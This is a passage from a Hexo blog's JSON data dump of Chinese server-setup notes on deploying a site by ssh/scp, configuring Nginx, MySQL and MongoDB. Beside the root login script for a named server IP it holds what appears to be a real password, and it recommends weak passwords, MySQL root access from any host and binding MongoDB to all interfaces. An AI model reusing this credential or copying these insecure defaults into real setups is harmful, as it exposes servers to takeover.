使用管理员权限</h3><h3 id=\"创建登录脚本\"><a href=\"#创建登录脚本\" class=\"headerlink\" title=\"创建登录脚本\"></a><strong>创建登录脚本</strong></h3><blockquote>\n<p>cd /usr/local/bin/<br>vim login  <code>// Jdyx8*5</code><br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">ssh root@47.104.231.254</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<h3 id=\"创建文件上脚本\"><a href=\"#创建文件上脚本\" class=\"headerlink\" title=\"创建文件上脚本\"></a><strong>创建文件上脚本</strong></h3><blockquote>\n<p>cd /usr/local/bin/<br>vim remoteDeploy  <code>// Jdyx8*5</code><br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">scp -r /mnt/d/Project/shrs/dist/* root@47.104.231.254:/mnt/www/shrs2006.com</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<h3 id=\"sudo-su-管理员权限运行\"><a href=\"#sudo-su-管理员权限运行\" class=\"headerlink\" title=\"sudo su 管理员权限运行\"></a><a href=\"https://blog.csdn.net/guoweimelon/article/details/50471561\" target=\"_blank\" rel=\"noopener\">sudo su 管理员权限运行</a></h3><blockquote>\n<p>chmod a+x file-name <a href=\"http://man.linuxde.net/chmod\" target=\"_blank\" rel=\"noopener\">提升权限</a></p>\n</blockquote>\n<h3 id=\"第一步-使用pkg包管理工具搜索-安装Nginx\"><a href=\"#第一步-使用pkg包管理工具搜索-安装Nginx\" class=\"headerlink\" title=\"第一步 使用pkg包管理工具搜索/安装Nginx\"></a><strong>第一步 使用pkg包管理工具<code>搜索/安装</code>Nginx</strong></h3><p> FreeBSD 安装 NGINX  // done<br> FreeBSD 下 <code>pkg</code> 包管理工具<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pkg search pkgName // 搜索</span><br><span class=\"line\">pkg install pkgName[必须是完整名称，可以先search关键字，后复制全称安装]</span><br></pre></td></tr></table></figure></p>\n<p> Nginx 安装完成后<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable nginx // 设置开机启动 注意版本，在主流Linux版本下有效 as Ubuntu、CentOS</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第二步-启动后台服务\"><a href=\"#第二步-启动后台服务\" class=\"headerlink\" title=\"第二步 启动后台服务\"></a><strong>第二步 启动后台服务</strong></h3><p> 作为后台服务 启动服务<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nginx onestart</span><br><span class=\"line\">service nginx onerestart</span><br><span class=\"line\">service nginx onestop</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Nginx总配置文件目录\"><a href=\"#Nginx总配置文件目录\" class=\"headerlink\" title=\"Nginx总配置文件目录\"></a>Nginx总配置文件目录</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/etc/nginx</span><br><span class=\"line\"></span><br><span class=\"line\">gzip  on;</span><br><span class=\"line\">    include /mnt/www/etc/nginx/*.conf;    # !* import</span><br></pre></td></tr></table></figure>\n<h4 id=\"分配置文件\"><a href=\"#分配置文件\" class=\"headerlink\" title=\"分配置文件\"></a>分配置文件</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\">        server_name localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        default_type &apos;text/html&apos;;</span><br><span class=\"line\">        charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">                root /mnt/www/shrs2006.com;</span><br><span class=\"line\">                index index.html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>配置Nginx</strong></p>\n<p>1.总配置文件，加分配至文件目录。虚拟主机 /usr/local/etc/nginx</p>\n<p>2.分配置文件 以<code>域名</code>命名  <code>/mnt/www/etc/nginx/shrs2006.com.conf</code> // 一个网站 对应一个配置文件</p>\n<h3 id=\"调试，修改host文件\"><a href=\"#调试，修改host文件\" class=\"headerlink\" title=\"调试，修改host文件\"></a>调试，修改host文件</h3><ol>\n<li>C:\\Windows\\System32\\drivers\\etc</li>\n<li>修改host (<a href=\"https://jingyan.baidu.com/article/624e7459b194f134e8ba5a8e.html\" target=\"_blank\" rel=\"noopener\">host修改权限</a>)</li>\n<li><a href=\"https://jingyan.baidu.com/article/5bbb5a1b15c97c13eba1798a.html\" target=\"_blank\" rel=\"noopener\">修改host</a></li>\n</ol>\n<p>绑定假域名</p>\n<p>www.shrs2006.test =&gt; IP windows hosts</p>\n<p>host文件:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">47.104.231.254          www.shrs2006.test // 末尾加入字段</span><br></pre></td></tr></table></figure></p>\n<p>// done</p>\n<h3 id=\"第三步-上传-项目文件\"><a href=\"#第三步-上传-项目文件\" class=\"headerlink\" title=\"第三步 上传 项目文件\"></a>第三步 上传 项目文件</h3><p>scp 脚本 项目生成后dist文件夹 上传指定目录下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt/www/shrs2006.com</span><br><span class=\"line\"></span><br><span class=\"line\">scp /mnt/d/Project/shrs/dist root@47.104.231.254:/mnt/www/shrs2006.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h3><p>访问 网址 检测是否部署成功</p>\n<p>重启服务器，打开假域名、可以看到网站 算成功。</p>\n<h3 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h3><p>重启 Nginx 服务<br><a href=\"https://www.cnblogs.com/zhj5551/p/7589078.html\" target=\"_blank\" rel=\"noopener\">命令</a></p>\n<p>并且要求 开机启动 <a href=\"https://www.ezloo.com/2009/05/linux_poweroff_and_reboot.html\" target=\"_blank\" rel=\"noopener\">Linux的关机与重启命令</a></p>\n"},{"title":"Nginx配置","date":"2018-08-10T02:00:45.000Z","_content":"## find / -name nginx*\n> vim /etc/*/nginx.conf\n> include /etc/nginx/conf.d/*.conf; // 分配置文件目录 绑定域名\n\n## Tsxt服务器 Nginx 分配置目录\n> /etc/nginx/conf.d >> *.conf\n\n\n## jdyxqq.com 自定义 Nginx主配置目录\n> /mnt/www/etc/nginx\n\n## mv 修改拓展名\n\n## 注意端口有没有被占用\n\n## 重启服务器 或者 关闭占用端口进程\n\n## 每次修改分配置文件都要重启Nginx\n> service nginx restart\n\n## \n","source":"_posts/server/Nginx配置.md","raw":"---\ntitle: Nginx配置\ndate: 2018-08-10 10:00:45\ntags: \ncategories: \n---\n## find / -name nginx*\n> vim /etc/*/nginx.conf\n> include /etc/nginx/conf.d/*.conf; // 分配置文件目录 绑定域名\n\n## Tsxt服务器 Nginx 分配置目录\n> /etc/nginx/conf.d >> *.conf\n\n\n## jdyxqq.com 自定义 Nginx主配置目录\n> /mnt/www/etc/nginx\n\n## mv 修改拓展名\n\n## 注意端口有没有被占用\n\n## 重启服务器 或者 关闭占用端口进程\n\n## 每次修改分配置文件都要重启Nginx\n> service nginx restart\n\n## \n","slug":"server/Nginx配置","published":1,"updated":"2018-09-05T06:33:18.511Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwv005czodvni8pnn5c","content":"<h2 id=\"find-name-nginx\"><a href=\"#find-name-nginx\" class=\"headerlink\" title=\"find / -name nginx*\"></a>find / -name nginx*</h2><blockquote>\n<p>vim /etc/<em>/nginx.conf<br>include /etc/nginx/conf.d/</em>.conf; // 分配置文件目录 绑定域名</p>\n</blockquote>\n<h2 id=\"Tsxt服务器-Nginx-分配置目录\"><a href=\"#Tsxt服务器-Nginx-分配置目录\" class=\"headerlink\" title=\"Tsxt服务器 Nginx 分配置目录\"></a>Tsxt服务器 Nginx 分配置目录</h2><blockquote>\n<p>/etc/nginx/conf.d &gt;&gt; *.conf</p>\n</blockquote>\n<h2 id=\"jdyxqq-com-自定义-Nginx主配置目录\"><a href=\"#jdyxqq-com-自定义-Nginx主配置目录\" class=\"headerlink\" title=\"jdyxqq.com 自定义 Nginx主配置目录\"></a>jdyxqq.com 自定义 Nginx主配置目录</h2><blockquote>\n<p>/mnt/www/etc/nginx</p>\n</blockquote>\n<h2 id=\"mv-修改拓展名\"><a href=\"#mv-修改拓展名\" class=\"headerlink\" title=\"mv 修改拓展名\"></a>mv 修改拓展名</h2><h2 id=\"注意端口有没有被占用\"><a href=\"#注意端口有没有被占用\" class=\"headerlink\" title=\"注意端口有没有被占用\"></a>注意端口有没有被占用</h2><h2 id=\"重启服务器-或者-关闭占用端口进程\"><a href=\"#重启服务器-或者-关闭占用端口进程\" class=\"headerlink\" title=\"重启服务器 或者 关闭占用端口进程\"></a>重启服务器 或者 关闭占用端口进程</h2><h2 id=\"每次修改分配置文件都要重启Nginx\"><a href=\"#每次修改分配置文件都要重启Nginx\" class=\"headerlink\" title=\"每次修改分配置文件都要重启Nginx\"></a>每次修改分配置文件都要重启Nginx</h2><blockquote>\n<p>service nginx restart</p>\n</blockquote>\n<p>## </p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"find-name-nginx\"><a href=\"#find-name-nginx\" class=\"headerlink\" title=\"find / -name nginx*\"></a>find / -name nginx*</h2><blockquote>\n<p>vim /etc/<em>/nginx.conf<br>include /etc/nginx/conf.d/</em>.conf; // 分配置文件目录 绑定域名</p>\n</blockquote>\n<h2 id=\"Tsxt服务器-Nginx-分配置目录\"><a href=\"#Tsxt服务器-Nginx-分配置目录\" class=\"headerlink\" title=\"Tsxt服务器 Nginx 分配置目录\"></a>Tsxt服务器 Nginx 分配置目录</h2><blockquote>\n<p>/etc/nginx/conf.d &gt;&gt; *.conf</p>\n</blockquote>\n<h2 id=\"jdyxqq-com-自定义-Nginx主配置目录\"><a href=\"#jdyxqq-com-自定义-Nginx主配置目录\" class=\"headerlink\" title=\"jdyxqq.com 自定义 Nginx主配置目录\"></a>jdyxqq.com 自定义 Nginx主配置目录</h2><blockquote>\n<p>/mnt/www/etc/nginx</p>\n</blockquote>\n<h2 id=\"mv-修改拓展名\"><a href=\"#mv-修改拓展名\" class=\"headerlink\" title=\"mv 修改拓展名\"></a>mv 修改拓展名</h2><h2 id=\"注意端口有没有被占用\"><a href=\"#注意端口有没有被占用\" class=\"headerlink\" title=\"注意端口有没有被占用\"></a>注意端口有没有被占用</h2><h2 id=\"重启服务器-或者-关闭占用端口进程\"><a href=\"#重启服务器-或者-关闭占用端口进程\" class=\"headerlink\" title=\"重启服务器 或者 关闭占用端口进程\"></a>重启服务器 或者 关闭占用端口进程</h2><h2 id=\"每次修改分配置文件都要重启Nginx\"><a href=\"#每次修改分配置文件都要重启Nginx\" class=\"headerlink\" title=\"每次修改分配置文件都要重启Nginx\"></a>每次修改分配置文件都要重启Nginx</h2><blockquote>\n<p>service nginx restart</p>\n</blockquote>\n<p>## </p>\n"},{"title":"Ubuntu 安装 mySQL","date":"2019-01-31T10:41:31.000Z","_content":"\n教程：https://blog.csdn.net/weixx3/article/details/80782479\n\n---\n\n> GRANT ALL PRIVILEGES ON *.* TO root@localhost IDENTIFIED BY \"123456\";\n\n> GRANT ALL PRIVILEGES ON *.* TO root@\"%\" IDENTIFIED BY \"123456\"; // 允许 root 远程连接\n---\n\n重启 服务\n> service '服务名' restart","source":"_posts/server/Ubuntu-安装-mySQL.md","raw":"---\ntitle: Ubuntu 安装 mySQL\ndate: 2019-01-31 18:41:31\ntags:\ncategories:\n---\n\n教程：https://blog.csdn.net/weixx3/article/details/80782479\n\n---\n\n> GRANT ALL PRIVILEGES ON *.* TO root@localhost IDENTIFIED BY \"123456\";\n\n> GRANT ALL PRIVILEGES ON *.* TO root@\"%\" IDENTIFIED BY \"123456\"; // 允许 root 远程连接\n---\n\n重启 服务\n> service '服务名' restart","slug":"server/Ubuntu-安装-mySQL","published":1,"updated":"2019-01-31T10:45:44.209Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxww005dzodva1w5a9rz","content":"<p>教程：<a href=\"https://blog.csdn.net/weixx3/article/details/80782479\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/weixx3/article/details/80782479</a></p>\n<hr>\n<blockquote>\n<p>GRANT ALL PRIVILEGES ON <em>.</em> TO root@localhost IDENTIFIED BY “123456”;</p>\n<h2 id=\"GRANT-ALL-PRIVILEGES-ON-TO-root-”-”-IDENTIFIED-BY-“123456”-允许-root-远程连接\"><a href=\"#GRANT-ALL-PRIVILEGES-ON-TO-root-”-”-IDENTIFIED-BY-“123456”-允许-root-远程连接\" class=\"headerlink\" title=\"GRANT ALL PRIVILEGES ON . TO root@”%” IDENTIFIED BY “123456”; // 允许 root 远程连接\"></a>GRANT ALL PRIVILEGES ON <em>.</em> TO root@”%” IDENTIFIED BY “123456”; // 允许 root 远程连接</h2></blockquote>\n<p>重启 服务</p>\n<blockquote>\n<p>service ‘服务名’ restart</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<p>教程：<a href=\"https://blog.csdn.net/weixx3/article/details/80782479\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/weixx3/article/details/80782479</a></p>\n<hr>\n<blockquote>\n<p>GRANT ALL PRIVILEGES ON <em>.</em> TO root@localhost IDENTIFIED BY “123456”;</p>\n<h2 id=\"GRANT-ALL-PRIVILEGES-ON-TO-root-”-”-IDENTIFIED-BY-“123456”-允许-root-远程连接\"><a href=\"#GRANT-ALL-PRIVILEGES-ON-TO-root-”-”-IDENTIFIED-BY-“123456”-允许-root-远程连接\" class=\"headerlink\" title=\"GRANT ALL PRIVILEGES ON . TO root@”%” IDENTIFIED BY “123456”; // 允许 root 远程连接\"></a>GRANT ALL PRIVILEGES ON <em>.</em> TO root@”%” IDENTIFIED BY “123456”; // 允许 root 远程连接</h2></blockquote>\n<p>重启 服务</p>\n<blockquote>\n<p>service ‘服务名’ restart</p>\n</blockquote>\n"},{"title":"服务器环境搭建","date":"2018-08-07T07:31:15.000Z","_content":"## 安装Nginx\n### [CentOS版]()\n### [Ubuntu版]()\n\n## 安装Git\n### [centos7安装最新版git](https://blog.csdn.net/zxy987872674/article/details/79220469)\n### [Centos7 yum install git2.x(较新版本)](https://blog.csdn.net/caimengyuan/article/details/80634752)\n\n## 安装Nvm\n### [Github-Nvm](https://github.com/creationix/nvm#installation)\n\n### [CentOS 7 使用NVM管理nodejs + Nvm安装Node+npm](https://blog.csdn.net/and04292/article/details/79423037)\n\n## 安装MongoDB\n### [Centos下安装配置Mongodb3.6](https://www.cnblogs.com/hackyo/p/7967170.html)\n---\n## [二进制文件安装](https://blog.csdn.net/rzrenyu/article/details/79472508)\n[二进制安装参考](https://blog.csdn.net/BeiiGang/article/details/43797009)  \n[参考二](https://www.imooc.com/article/15618?block_id=tuijian_wz)\n[参考三](https://www.jianshu.com/p/5598f1dcbb98)\n[参考四](https://www.linuxidc.com/Linux/2016-07/133254.htm)\n### 1、下载二进制文件安装包\n> curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.2.12.tgz\n\nhttps://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-3.6.6.tgz\n\nhttp://downloads.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-v3.6-latest.tgz\n\n### 2、解压\n> tar -zxvf [mongodb-linux-x86_64-3.2.12.tgz] // [包名]\n\n### 3、移动到指定位置\n> mv [mongodb-linux-x86_64-3.2.12/] /usr/local/mongodb // [解压后的文件夹]\n\n### 3.1 将`MongoDB的安装目录添加到Path`当中[环境变量配置]\n**p.s** 记得如果你的最后一个位置和我的不一样，请记得替换\n> vi /etc/profile  \n增加  \n> export PATH=/usr/local/mongodb/bin:$PATH  \n然后  \n> source /etc/profile // BLog 有坑！ 拼写错误\n\n### 4、在 `/usr/local/mongodb` 下创建文件夹\n> mkdir -p /data/db\n> \n> mkdir  /logs\n\n### *、创建 mongo 的数据目录\n!important\n> sudo mkdir -p /data/db    #创建数据存储目录\n> \n> sudo chmod 755 /data/*    #赋予目录权限\n\n### 配置MongoDB\n> 控制的配置文件在：/etc/mongodb.conf\n\n> 控制脚本在：/etc/init.d/mongodb\n\n> MongoDB实例会把数据存放在：/var/lib/mongodb  \n> 日志存放在：/var/log/mongodb  \n> 默认由mongodb用户运行。  \n\n### 5、在/usr/local/mongodb/bin下新建 **分配置文件**\n> vim mongodb.conf\n````\ndbpath = /usr/local/mongodb/data/db #数据文件存放目录\n\nlogpath = /usr/local/mongodb/logs/mongodb.log #日志文件存放目录\nport = 27017  #端口\nfork = true  #以守护程序的方式启用，即在后台运行\nnohttpinterface = true\nauth=true\nbind_ip=0.0.0.0\n````\n\n推荐第二种配置\n> vim /etc/mongod.conf\n\n\n````\nsystemLog:\n  destination: file\n  logAppend: true\n  path: /var/log/mongodb/mongod.log\n\nstorage:\n  dbPath: /var/lib/mongo\n  journal:\n    enabled: true\n\nprocessManagement:\n  fork: true\n  pidFilePath: /var/run/mongodb/mongod.pid\n\nnet:\n  port: 21111\n  bindIp: 0.0.0.0\n\nsecurity:\n  authorization: enabled\n  javascriptEnabled: false\n````\n\n### 6、环境变量配置\n> vi /etc/profile \n````\nexport MONGODB_HOME=/usr/local/mongodb\n\nexport PATH=$PATH:$MONGODB_HOME/bin\n````\n保存后，重启系统配置\n\n> source /etc/profile\n\n### 7、启动\n在`/usr/local/mongodb/bin`下\n\n> mongod -f mongodb.conf || ./mongod -f mongodb.conf\n\n### 8、关闭\n> mongod -f ./mongodb.conf --shutdown || ./mongod -f ./mongodb.conf --shutdown\n\n### 9、开启端口(CentOS防火墙firewall)\n> firewall-cmd --zone=public --add-port=27017/tcp --permanent\n查看端口\n\n> firewall-cmd --permanent --query-port=27017/tcp\n重启防火墙\n\n> firewall-cmd --reload\n\n### 10、创建用户管理员：\n````\nuse admin\n\ndb.createUser({user:\"root\",pwd:\"root123456\",roles:[\"userAdminAnyDatabase\"]})\n\ndb.auth('root','root123456')\n````\n### 补充：\n````\n//mongodb中bin的文件说明\n1.mongod : 执行程序\n2.mongo : 用于连接客户端\n3.mongoimport/mongoexport : 导入/导出\n4.mongodump/mongorestore : 备份/恢复数据(二进制文件，不能被直接读取，一般用来做数据的备份)\n5.mongooplog : 用来操作日志的回放\noplog : MongoDB复制集中用来记录操作记录的数据集合\n6.mongostat : 用来查看mongo服务器的各种状态\nscons all -j 12(编译,12是指CPU的核数)\nmongod是主角，数据库执行程序\nmongo 用来连接服务器的客户端\nmongoimport mongoexport 导入到处\nmongodump mongorestore 二进制北非回复\nmongostat 查看服务器状态\nmongoDB编译：进入源码目录，执行scons all进行编译。scons all -j 10 使用-j参数可以指定cpu的核数。\n编译后的文件：\nmongod:mongodb的启动文件，用来部署数据库\nmongo：链接服务器的客户端\nmongoimport,,mongoexport:用来导入导出数据库\nmongodump,mongorestore:用来导入导出二进制数据，一般用来数据的备份与恢复。\nmongologoplog 操作日志\nmongostat:用来查看mongodb服务器的各种状态\n\n````\n\n## [Linux 采用 `systemctl` 命令设置 `mongodb` 自启动](https://blog.csdn.net/xhzq1986/article/details/79761263)\n需要学习的命令是 [systemctl](http://www.jinbuguo.com/systemd/systemd.service.html)\n需要知晓的目录是 `/usr/lib/systemd/system`\n需要掌握 `mongodb.service` 的书写格式，demo如下\n````\n[Unit]\nDescription=mongodb\nAfter=network.target remote-fs.target nss-lookup.target  \n  \n[Service]  \nType=forking  \nExecStart=/usr/local/mongodb/bin/mongod --config /home/mongodb/mongodb/bin/mongod.conf\nExecReload=/bin/kill -s HUP $MAINPID\nExecStop=/usr/local/mongodb/bin/mongod --shutdown --config /home/mongodb/mongodb/bin/mongod.conf\nPrivateTmp=true  \n    \n[Install]  \nWantedBy=multi-user.target\n````\n最初博主在 `ExecStart` 的写法是:  \n> /home/mongodb/mongodb/bin/mongod --dbpath=/home/mongodb/mongodb/db --logpath=/home/mongodb/mongodb/logs/`date +%Y-%m-%d`.log --logappend --auth --fork &\n\n后来参考资料改成：  \n> /home/mongodb/mongodb/bin/mongod --config /home/mongodb/mongodb/bin/mongod.conf\n\n---\n## **附录：**\n\n1. [Linux下curl命令的使用](https://blog.csdn.net/wangjianno2/article/details/39718681)\n2. [Linux curl命令详解](https://www.cnblogs.com/duhuo/p/5695256.html)\n3. [查看CentOS版本信息](https://blog.csdn.net/shuaigexiaobo/article/details/78030008)","source":"_posts/server/服务器环境搭建.md","raw":"---\ntitle: 服务器环境搭建\ndate: 2018-08-07 15:31:15\ntags: 服务器环境配置\ncategories: Server\n---\n## 安装Nginx\n### [CentOS版]()\n### [Ubuntu版]()\n\n## 安装Git\n### [centos7安装最新版git](https://blog.csdn.net/zxy987872674/article/details/79220469)\n### [Centos7 yum install git2.x(较新版本)](https://blog.csdn.net/caimengyuan/article/details/80634752)\n\n## 安装Nvm\n### [Github-Nvm](https://github.com/creationix/nvm#installation)\n\n### [CentOS 7 使用NVM管理nodejs + Nvm安装Node+npm](https://blog.csdn.net/and04292/article/details/79423037)\n\n## 安装MongoDB\n### [Centos下安装配置Mongodb3.6](https://www.cnblogs.com/hackyo/p/7967170.html)\n---\n## [二进制文件安装](https://blog.csdn.net/rzrenyu/article/details/79472508)\n[二进制安装参考](https://blog.csdn.net/BeiiGang/article/details/43797009)  \n[参考二](https://www.imooc.com/article/15618?block_id=tuijian_wz)\n[参考三](https://www.jianshu.com/p/5598f1dcbb98)\n[参考四](https://www.linuxidc.com/Linux/2016-07/133254.htm)\n### 1、下载二进制文件安装包\n> curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.2.12.tgz\n\nhttps://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-3.6.6.tgz\n\nhttp://downloads.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-v3.6-latest.tgz\n\n### 2、解压\n> tar -zxvf [mongodb-linux-x86_64-3.2.12.tgz] // [包名]\n\n### 3、移动到指定位置\n> mv [mongodb-linux-x86_64-3.2.12/] /usr/local/mongodb // [解压后的文件夹]\n\n### 3.1 将`MongoDB的安装目录添加到Path`当中[环境变量配置]\n**p.s** 记得如果你的最后一个位置和我的不一样，请记得替换\n> vi /etc/profile  \n增加  \n> export PATH=/usr/local/mongodb/bin:$PATH  \n然后  \n> source /etc/profile // BLog 有坑！ 拼写错误\n\n### 4、在 `/usr/local/mongodb` 下创建文件夹\n> mkdir -p /data/db\n> \n> mkdir  /logs\n\n### *、创建 mongo 的数据目录\n!important\n> sudo mkdir -p /data/db    #创建数据存储目录\n> \n> sudo chmod 755 /data/*    #赋予目录权限\n\n### 配置MongoDB\n> 控制的配置文件在：/etc/mongodb.conf\n\n> 控制脚本在：/etc/init.d/mongodb\n\n> MongoDB实例会把数据存放在：/var/lib/mongodb  \n> 日志存放在：/var/log/mongodb  \n> 默认由mongodb用户运行。  \n\n### 5、在/usr/local/mongodb/bin下新建 **分配置文件**\n> vim mongodb.conf\n````\ndbpath = /usr/local/mongodb/data/db #数据文件存放目录\n\nlogpath = /usr/local/mongodb/logs/mongodb.log #日志文件存放目录\nport = 27017  #端口\nfork = true  #以守护程序的方式启用，即在后台运行\nnohttpinterface = true\nauth=true\nbind_ip=0.0.0.0\n````\n\n推荐第二种配置\n> vim /etc/mongod.conf\n\n\n````\nsystemLog:\n  destination: file\n  logAppend: true\n  path: /var/log/mongodb/mongod.log\n\nstorage:\n  dbPath: /var/lib/mongo\n  journal:\n    enabled: true\n\nprocessManagement:\n  fork: true\n  pidFilePath: /var/run/mongodb/mongod.pid\n\nnet:\n  port: 21111\n  bindIp: 0.0.0.0\n\nsecurity:\n  authorization: enabled\n  javascriptEnabled: false\n````\n\n### 6、环境变量配置\n> vi /etc/profile \n````\nexport MONGODB_HOME=/usr/local/mongodb\n\nexport PATH=$PATH:$MONGODB_HOME/bin\n````\n保存后，重启系统配置\n\n> source /etc/profile\n\n### 7、启动\n在`/usr/local/mongodb/bin`下\n\n> mongod -f mongodb.conf || ./mongod -f mongodb.conf\n\n### 8、关闭\n> mongod -f ./mongodb.conf --shutdown || ./mongod -f ./mongodb.conf --shutdown\n\n### 9、开启端口(CentOS防火墙firewall)\n> firewall-cmd --zone=public --add-port=27017/tcp --permanent\n查看端口\n\n> firewall-cmd --permanent --query-port=27017/tcp\n重启防火墙\n\n> firewall-cmd --reload\n\n### 10、创建用户管理员：\n````\nuse admin\n\ndb.createUser({user:\"root\",pwd:\"root123456\",roles:[\"userAdminAnyDatabase\"]})\n\ndb.auth('root','root123456')\n````\n### 补充：\n````\n//mongodb中bin的文件说明\n1.mongod : 执行程序\n2.mongo : 用于连接客户端\n3.mongoimport/mongoexport : 导入/导出\n4.mongodump/mongorestore : 备份/恢复数据(二进制文件，不能被直接读取，一般用来做数据的备份)\n5.mongooplog : 用来操作日志的回放\noplog : MongoDB复制集中用来记录操作记录的数据集合\n6.mongostat : 用来查看mongo服务器的各种状态\nscons all -j 12(编译,12是指CPU的核数)\nmongod是主角，数据库执行程序\nmongo 用来连接服务器的客户端\nmongoimport mongoexport 导入到处\nmongodump mongorestore 二进制北非回复\nmongostat 查看服务器状态\nmongoDB编译：进入源码目录，执行scons all进行编译。scons all -j 10 使用-j参数可以指定cpu的核数。\n编译后的文件：\nmongod:mongodb的启动文件，用来部署数据库\nmongo：链接服务器的客户端\nmongoimport,,mongoexport:用来导入导出数据库\nmongodump,mongorestore:用来导入导出二进制数据，一般用来数据的备份与恢复。\nmongologoplog 操作日志\nmongostat:用来查看mongodb服务器的各种状态\n\n````\n\n## [Linux 采用 `systemctl` 命令设置 `mongodb` 自启动](https://blog.csdn.net/xhzq1986/article/details/79761263)\n需要学习的命令是 [systemctl](http://www.jinbuguo.com/systemd/systemd.service.html)\n需要知晓的目录是 `/usr/lib/systemd/system`\n需要掌握 `mongodb.service` 的书写格式，demo如下\n````\n[Unit]\nDescription=mongodb\nAfter=network.target remote-fs.target nss-lookup.target  \n  \n[Service]  \nType=forking  \nExecStart=/usr/local/mongodb/bin/mongod --config /home/mongodb/mongodb/bin/mongod.conf\nExecReload=/bin/kill -s HUP $MAINPID\nExecStop=/usr/local/mongodb/bin/mongod --shutdown --config /home/mongodb/mongodb/bin/mongod.conf\nPrivateTmp=true  \n    \n[Install]  \nWantedBy=multi-user.target\n````\n最初博主在 `ExecStart` 的写法是:  \n> /home/mongodb/mongodb/bin/mongod --dbpath=/home/mongodb/mongodb/db --logpath=/home/mongodb/mongodb/logs/`date +%Y-%m-%d`.log --logappend --auth --fork &\n\n后来参考资料改成：  \n> /home/mongodb/mongodb/bin/mongod --config /home/mongodb/mongodb/bin/mongod.conf\n\n---\n## **附录：**\n\n1. [Linux下curl命令的使用](https://blog.csdn.net/wangjianno2/article/details/39718681)\n2. [Linux curl命令详解](https://www.cnblogs.com/duhuo/p/5695256.html)\n3. [查看CentOS版本信息](https://blog.csdn.net/shuaigexiaobo/article/details/78030008)","slug":"server/服务器环境搭建","published":1,"updated":"2018-09-05T06:33:18.511Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwz005izodv0wj0uw27","content":"<h2 id=\"安装Nginx\"><a href=\"#安装Nginx\" class=\"headerlink\" title=\"安装Nginx\"></a>安装Nginx</h2><h3 id=\"CentOS版\"><a href=\"#CentOS版\" class=\"headerlink\" title=\"CentOS版\"></a><a href=\"\">CentOS版</a></h3><h3 id=\"Ubuntu版\"><a href=\"#Ubuntu版\" class=\"headerlink\" title=\"Ubuntu版\"></a><a href=\"\">Ubuntu版</a></h3><h2 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h2><h3 id=\"centos7安装最新版git\"><a href=\"#centos7安装最新版git\" class=\"headerlink\" title=\"centos7安装最新版git\"></a><a href=\"https://blog.csdn.net/zxy987872674/article/details/79220469\" target=\"_blank\" rel=\"noopener\">centos7安装最新版git</a></h3><h3 id=\"Centos7-yum-install-git2-x-较新版本\"><a href=\"#Centos7-yum-install-git2-x-较新版本\" class=\"headerlink\" title=\"Centos7 yum install git2.x(较新版本)\"></a><a href=\"https://blog.csdn.net/caimengyuan/article/details/80634752\" target=\"_blank\" rel=\"noopener\">Centos7 yum install git2.x(较新版本)</a></h3><h2 id=\"安装Nvm\"><a href=\"#安装Nvm\" class=\"headerlink\" title=\"安装Nvm\"></a>安装Nvm</h2><h3 